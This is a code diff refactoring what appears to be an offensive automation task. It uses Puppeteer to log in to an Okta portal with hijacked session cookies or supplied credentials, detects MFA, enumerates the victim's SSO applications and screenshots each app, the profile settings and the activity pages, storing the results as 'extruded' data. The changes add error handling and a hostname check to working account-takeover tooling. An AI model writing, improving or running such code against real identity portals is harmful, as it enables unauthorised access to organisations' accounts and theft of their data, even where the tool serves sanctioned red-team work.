@@ -29,11 +29,11 @@ const clusterLib = require('../../puppeteer/cluster')
  * 8. Enumerate apps and take screenshots
  */
 exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) => {
-    await db.UpdateTaskStatus(taskId, "running")
-
+    return necrohelp.runTask(db, taskId, async () => {
     const email = params.email
     const password = params.password
     const oktaPortal = params.oktaPortal
+    if (!oktaPortal || /[\s/:]/.test(oktaPortal)) throw new Error('params.oktaPortal must be a hostname')
     const oktaUrl = `https://${oktaPortal}`
 
     console.log(`[${taskId}] Starting Okta login automation for portal: ${oktaPortal}`)
@@ -41,7 +41,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
     // Set cookies BEFORE navigating (like office365 tasks)
     if (cookies && cookies.length > 0) {
         console.log(`[${taskId}] Setting ${cookies.length} Okta cookies before navigation`)
-        await necrohelp.SetCookies(page, cookies);
+        await necrohelp.SetCookieJar(page, cookies);
     }
 
     await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
@@ -52,7 +52,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
     try {
         // Navigate to Okta portal
         console.log(`[${taskId}] Navigating to Okta portal: ${oktaUrl}`)
-        await page.goto(oktaUrl, { waitUntil: 'networkidle0', timeout: 30000 })
+        await necrohelp.timedGoto(page,oktaUrl, { waitUntil: 'networkidle0', timeout: 30000 })
         await necrohelp.Sleep(5000)
 
         // Take screenshot of initial landing page
@@ -88,8 +88,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
             if (!email || !password) {
                 const errorMsg = "Not logged in and no credentials provided. Either provide valid cookies or email/password."
                 console.log(`[${taskId}] ${errorMsg}`)
-                await db.UpdateTaskStatusWithReason(taskId, "error", errorMsg)
-                return
+                throw new Error(errorMsg)
             }
 
             console.log(`[${taskId}] Not logged in via cookies, proceeding with credential authentication`)
@@ -107,7 +106,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
 
             // Step 2: Click Next button
             console.log(`[${taskId}] Clicking Next button`)
-            await page.click('input.button.button-primary[type="submit"][value="Next"]').catch(console.error)
+            await page.click('input.button.button-primary[type="submit"][value="Next"]')
             await necrohelp.Sleep(3000)
 
             // Take screenshot after clicking Next
@@ -134,7 +133,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
 
                 // Click Verify button
                 console.log(`[${taskId}] Clicking Verify button`)
-                await page.click('input.button.button-primary[type="submit"][value="Verify"]').catch(console.error)
+                await page.click('input.button.button-primary[type="submit"][value="Verify"]')
 
             } else {
                 // FLOW A: Authentication method selection page
@@ -171,8 +170,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
                     // If MFA is required and we can't proceed, stop here
                     const errorMsg = "Password authentication not available. MFA may be required."
                     console.log(`[${taskId}] ${errorMsg}`)
-                    await db.UpdateTaskStatusWithReason(taskId, "error", errorMsg)
-                    return
+                    throw new Error(errorMsg)
                 }
 
                 // Click Password select button
@@ -188,7 +186,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
 
                 // Click Verify button
                 console.log(`[${taskId}] Clicking Verify button`)
-                await page.click('input.button.button-primary[type="submit"][value="Verify"]').catch(console.error)
+                await page.click('input.button.button-primary[type="submit"][value="Verify"]')
             }
 
             // Wait for page transition after clicking Verify (common for both flows)
@@ -212,7 +210,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
             // Additional wait to ensure page rendering is fully complete
             await necrohelp.Sleep(2000)
 
-            // Take screenshot after verification (both Redis and filesystem)
+            // Take screenshot after verification (both SQLite and filesystem)
             await necrohelp.ScreenshotCurrentPage(page, taskId)
             await db.AddExtrudedData(taskId, 'step', Buffer.from('06_after_verify').toString('base64'))
 
@@ -238,8 +236,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
             // Still on login page, authentication failed
             const errorMsg = await page.$eval('.okta-form-infobox-error', el => el.textContent).catch(() => 'Unknown error')
             console.log(`[${taskId}] Login failed: ${errorMsg}`)
-            await db.UpdateTaskStatusWithReason(taskId, "error", `Login failed: ${errorMsg}`)
-            return
+            throw new Error(`Login failed: ${errorMsg}`)
         }
 
         console.log(`[${taskId}] Successfully logged in to Okta`)
@@ -270,6 +267,7 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
         await db.AddExtrudedData(taskId, 'apps_list', Buffer.from(appsJson).toString('base64'))
 
         // Open and screenshot each application
+        const failures = []
         for (let i = 0; i < apps.length; i++) {
             const app = apps[i]
             console.log(`[${taskId}] Opening app ${i + 1}/${apps.length}: ${app.name}`)
@@ -277,30 +275,40 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
             try {
                 await openAndScreenshotApp(page, taskId, app, i)
             } catch (error) {
-                console.log(`[${taskId}] Error opening app "${app.name}": ${error.message}`)
+                failures.push({ item: `app:${app.name}`, error: error.message })
             }
 
             // Navigate back to dashboard
-            await page.goto(oktaUrl, { waitUntil: 'networkidle0', timeout: 30000 })
+            await necrohelp.timedGoto(page,oktaUrl, { waitUntil: 'networkidle0', timeout: 30000 })
             await necrohelp.Sleep(3000)
         }
 
         // Screenshot user profile settings
         console.log(`[${taskId}] Navigating to profile settings`)
-        await screenshotProfileSettings(page, taskId, oktaUrl)
+        try {
+            await screenshotProfileSettings(page, taskId, oktaUrl)
+        } catch (error) {
+            failures.push({ item: 'profile_settings', error: error.message })
+        }
 
         // Screenshot last activity page
         console.log(`[${taskId}] Navigating to last activity page`)
-        await screenshotLastActivity(page, taskId, oktaUrl)
+        try {
+            await screenshotLastActivity(page, taskId, oktaUrl)
+        } catch (error) {
+            failures.push({ item: 'last_activity', error: error.message })
+        }
 
         console.log(`[${taskId}] Okta enumeration completed successfully`)
-        await db.UpdateTaskStatus(taskId, "completed")
+        return failures.length ? { status: 'partial', failures } : { status: 'completed' };
+
 
     } catch (error) {
         console.log(`[${taskId}] Error during Okta automation: ${error.message}`)
-        await necrohelp.ScreenshotCurrentPage(page, taskId).catch(console.error)
-        await db.UpdateTaskStatusWithReason(taskId, "error", error.message)
+        await necrohelp.ScreenshotCurrentPage(page, taskId).catch(() => undefined)
+        throw error
     }
+    })
 }
 
 /**
@@ -343,7 +351,7 @@ async function checkForMFA(page, taskId) {
         await db.AddExtrudedData(taskId, 'mfa_on_login', Buffer.from('true').toString('base64'))
         await db.AddExtrudedData(taskId, 'mfa_type', Buffer.from(mfaType).toString('base64'))
 
-        // Take screenshot of MFA page (both Redis and filesystem)
+        // Take screenshot of MFA page (both SQLite and filesystem)
         await necrohelp.ScreenshotCurrentPage(page, taskId)
         await db.AddExtrudedData(taskId, 'step', Buffer.from('03b_mfa_prompt').toString('base64'))
 
@@ -463,7 +471,7 @@ async function openAndScreenshotApp(page, taskId, app, index) {
         for (const selector of appSelectors) {
             const element = await page.$(selector).catch(() => null)
             if (element) {
-                await element.click().catch(console.error)
+                await element.click()
                 clicked = true
                 break
             }
@@ -471,7 +479,7 @@ async function openAndScreenshotApp(page, taskId, app, index) {
 
         if (!clicked && app.link) {
             console.log(`[${taskId}] Could not click app element, navigating directly to: ${app.link}`)
-            await page.goto(app.link, { waitUntil: 'networkidle0', timeout: 30000 })
+            await necrohelp.timedGoto(page,app.link, { waitUntil: 'networkidle0', timeout: 30000 })
         }
 
         // Wait for navigation or new tab
@@ -527,7 +535,7 @@ async function checkForSSOMFA(page, taskId, appName, index) {
         const element = await page.$(selector).catch(() => null)
         if (element) {
             console.log(`[${taskId}] SSO MFA detected for "${appName}" with selector: ${selector}`)
-            // Take screenshot of SSO MFA page (both Redis and filesystem)
+            // Take screenshot of SSO MFA page (both SQLite and filesystem)
             await necrohelp.ScreenshotCurrentPage(page, taskId)
             await db.AddExtrudedData(taskId, `app_${index}_mfa_screenshot`, Buffer.from('captured').toString('base64'))
 
@@ -551,7 +559,7 @@ async function checkForSSOMFA(page, taskId, appName, index) {
 async function screenshotProfileSettings(page, taskId, oktaUrl) {
     try {
         // Navigate to settings
-        await page.goto(`${oktaUrl}/enduser/settings`, { waitUntil: 'networkidle0', timeout: 30000 })
+        await necrohelp.timedGoto(page,`${oktaUrl}/enduser/settings`, { waitUntil: 'networkidle0', timeout: 30000 })
         await necrohelp.Sleep(3000)
 
         // Take screenshot
@@ -598,7 +606,7 @@ async function screenshotLastActivity(page, taskId, oktaUrl) {
         let activityFound = false
 
         for (const url of activityUrls) {
-            await page.goto(url, { waitUntil: 'networkidle0', timeout: 30000 }).catch(console.error)
+            await necrohelp.timedGoto(page,url, { waitUntil: 'networkidle0', timeout: 30000 })
             await necrohelp.Sleep(3000)
 
             // Check if we can find activity-related elements
